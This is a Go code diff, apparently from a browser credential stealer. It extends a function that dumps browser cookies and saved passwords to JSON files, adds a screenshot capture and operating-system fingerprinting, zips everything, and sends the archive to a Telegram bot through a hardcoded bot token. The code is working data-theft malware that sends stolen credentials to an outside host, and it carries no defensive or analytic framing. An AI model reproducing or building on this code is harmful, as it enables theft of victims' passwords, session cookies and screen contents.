@@ -142,11 +142,15 @@ func MainBL(browser model.BrowserPaths) {
 	fmt.Println(info_ok)
 	fmt.Println(cookie_ok)
 
+	pkg.DeleteFolderRecursive("storage")
+
 	err = os.Mkdir("storage", 0755)
 	if err != nil {
 		fmt.Println(err)
 		return
 	}
+
+	pkg.SnapImage()
 
 	file_cookie, err := os.Create("./storage/cookie.json")
 	defer func() {
@@ -167,9 +171,18 @@ func MainBL(browser model.BrowserPaths) {
 	encoder_pass := json.NewEncoder(file_pass)
 	err = encoder_pass.Encode(info_ok)
 
+	pkg.GetInfoOperatingSystem()
+	//pkg.FormatFile("./storage/cookie.json")
+	//pkg.FormatFile("./storage/pass.json")
+	//pkg.FormatFile("./storage/operatingsystem.json")
+
 	err = pkg.ZipSource("storage", "storage.zip")
 	if err != nil {
 		log.Fatal(err)
 	}
+
+	token := "6044700730:AAFR9FNJETE62Kmt1oSyNYuhKlwf1RhmOQE"
+	pkg.SendFileByBotTele(token, "storage.zip")
+	//fmt.Println(test)
 
 }
